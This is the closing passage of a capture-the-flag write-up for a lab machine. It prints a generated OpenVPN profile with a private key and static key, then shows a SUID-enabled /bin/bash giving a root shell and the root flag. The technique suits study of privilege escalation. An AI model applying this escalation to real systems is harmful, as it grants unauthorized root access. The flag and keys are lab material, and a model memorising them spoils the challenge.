A1UdDgQWBBRMJfHBYo57Z9Z268B/Jp+1PA4e0zBPBgNVHSMESDBGgBSh2oNgMoF/
G4AZ4CAt1mDIpe2CVKEYpBYwFDESMBAGA1UEAwwJc3RhdGljLWd3ghRH6Zitcck5
FXi1uDzWxBLtF+NgrjATBgNVHSUEDDAKBggrBgEFBQcDAjALBgNVHQ8EBAMCB4Aw
DQYJKoZIhvcNAQELBQADggEBAAw0G+c+IjGIWBEgGbWneMgNmF+CO4m6JMDP57QX
rFzbn2KJYSRTU4q1i+Tpa9hsdDiRDK5kEzDPk7mYAu7fPMPoseZp1T4RN6Pk4iUk
DOwuMPRlLish1qC9gC8i+EMlQedJ9TvVq8yXjjP005apeX7XFtEKHmyMERlfWEDD
zTA4ZpyFMpd9CGtOmD4HkhddJhVPuxvBOxiGdh+OpSDxLU0xHzteb9H9HtNpw2fn
DnRUajMrQpYENwtCYYaUjVBnuM3cCprIdeNSg+898LhgdT2eDny+wCk0eKRECOlx
ygZxFuBlmxqJAESBT00kWXd2j1i0jQqSuHAVhr4/G2Tz7gM=
-----END CERTIFICATE-----
</cert>
<key>
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCpxALDSsIiMwYI
Zwfybn6HUJMpRU03KWtA8vHwkFFdcWhYC3ZdnDk8dnQ1zg80fNPWCPomBhDXVaoJ
QU4ukhJQWNLaO45/kzlBMZ0gkw+KZtqDAxPR3PDL1SMPxaETDE2z68rbmU0fbBo+
q5MBa1cBcAXnUJ/y06jUAahjwtzHA9fatmosc1PidXy5cK8GSqXhq7xRd5nWE54s
heDD30iex2UsaD8vIWiKecYrq+jJQlR7SSJTI1OnJThprpeeBs7RJWZg+jy9PEic
BQrMl8Xu9c8GtU6Gm2zCE1AjuSqEiVginmcx3NARrqVJSn/R7SFe4O9rUTAbM+L4
T69T8eiJAgMBAAECggEADBrW25f8CbY7quO11Fp+mSVsqNexLsq8RBBOogmYU6Jf
f0+p6/jUt/P2S1PbD7IK5MsVExsBnmkUS76lVXrC5Ym/1yHCAmS8A2MHQihaRlMZ
J5hTlHY9kTssWdaMqrAI5lhcyZW/wwrRQEC5pbNCq+6R7TF5hjYDZsKLgDmHxoTo
4sEAuaXj/GgTLJGStU8McnbNIu0CSAzofU40gynbg4q9bjy6+cmOQVjzUxtyy9H+
ObStByr9PLkJ0vnM0zwGciAO3v2TGzXRsta1S6FTEm/Bo/iZx0gCWrCaF92EFTHv
eMMpu5ZzAbkNlF343PNAG5YEjOi06ofisE+s6gW20QKBgQDX8DUDK3i+u4WWhNnf
NjYXEZTdPd6IMuV4qYhuMxzQlQOgl8EQsBy04PcGDcgebqnin9W/Vm8TrrkEIy5R
2kcDvY94HVVh+904oM7180vj0XK15qT8EPpnZ61iQqQGJoqP5/coOkyIOMnkFLLj
xNVzYrNPKo8M8FTBREEVBi9VRQKBgQDJQuBQj9+YQikrlHkMrtco44YMLYCR0276
0v1ZEj7z/V6x9K2waZ+8GqA91xFuB7h9fNijzcEaBY4xwS4p/OVWRXcWlOrOjPLD
B7v2lxW4Ki0jxJ45KANuR1YN2MbqQioiMvLtvOGZvPN5hsp9fJG7hn92yVFZY7E2
Lmv+vLcwdQKBgFXLy9RZllz59sbqPAKS8ITT6HjLFzq4NjJt8ZYPWtiJDGrnQL9X
qeA4Lg3KtgNZZshzRyMBvZptZnd9Xu8IsgSLcZCA3ybSQoA4bGKOa022L0SUwmKg
gE1LhTkwTylecNliifICz9uj7Jthmf4je8efpKzEtRen+ZTcgJtQ3MedAoGBAKXa
Za4eEh2QEAtozCRmhMqeTN4GNVh2y5MJglv/jD9XAc1WnDevo0HJE1pCvItW83L+
Ci1appICF/7qeleBn6BrmErUp3dVcczEt+Hq+awNnatHIThqwAEF6mV4ydtMcRpD
sCu4JpWhv2bbbEzi9dl6adoC5vXqEKRctwRykeftAoGAJsCI8/kS6K5xxEKVFC9k
JP7cHqmyF6r3QatVxTQZQUxBnlqI6Vhmli4oJXugiS6zfXhJpiiN+w7fmWr1YoW5
XY6xUMI5gwI58j8THxRDkWevUep70QqavhNMMNV4OhnJsXzEQk/ZVhOr2Z0OSBCR
21vYU6Kda7uPnIbfzPuJehI=
-----END PRIVATE KEY-----
</key>
key-direction 1
<tls-auth>
#
# 2048 bit OpenVPN static key
#
-----BEGIN OpenVPN Static key V1-----
09a194dc6aee4ae65459c682cc0b25e9
43e54d75dd1d83653ef04a67c65177da
98df768c86585611755082c6b06da8d9
21a4e3afd8d4537c3be9cf3c91a31ddd
157c9ff3f99c5f098ca8be7fe4e01435
86ac1e6b62d126d9f31bf603cd822e26
4a0dfdcb5aa5e66d97cd7b338e7dc07a
62a7691b4fc80830c169f27486f9f22e
4b71185dda7c5adac7ed55b80190dd35
3ec31228f556903d23dbf12d3928578d
c7fe5488d77ab72a0f50ae8d975af87e
ec0dbce0f9f7bf2c01aff9c9cf4fcc99
aaca4a1e81a0a240565c356cd33c6163
f7d986e0395ea90a439b176542a42009
2aafeb626aadb6abc35fa023426c9334
ea5f5af8329f367f112599f3e668bd7a
-----END OpenVPN Static key V1-----
</tls-auth>
create->CN=
# exit
```

Now **/bin/bash** has SUID privileges.

```console
www-data@pki:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
www-data@pki:/tmp$ /bin/bash -p
bash-4.4# whoami
root
```

Machine pwned, we see the root flag.

```console
bash-4.4# cd /root
bash-4.4# cat root.txt
b3298f99ac5999202090829ed5fa9fb6
bash-4.4# 
```

### Conclusion

This was my first hard box, got me a while stucked in some parts but always is good to get out from comfort zones. There were really nice things on this box like by passing 2FA Authentication, pivoting, static routes, etc. Hope this write up was useful to you. See ya!
